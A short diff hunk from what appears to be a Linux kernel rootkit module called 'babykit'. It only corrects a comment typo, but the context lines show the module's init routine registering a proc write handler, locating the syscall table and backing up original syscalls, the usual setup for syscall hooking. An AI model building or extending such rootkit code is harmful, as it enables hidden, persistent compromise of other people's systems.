@@ -176,7 +176,7 @@ static int __init babykit_init(void)
 
   proc_file_entry->write_proc = babykit_write;
 
-  // Geting syscall table
+  // Getting syscall table
   sys_call_table = get_sys_call_table();
 
   // Original syscalls backup
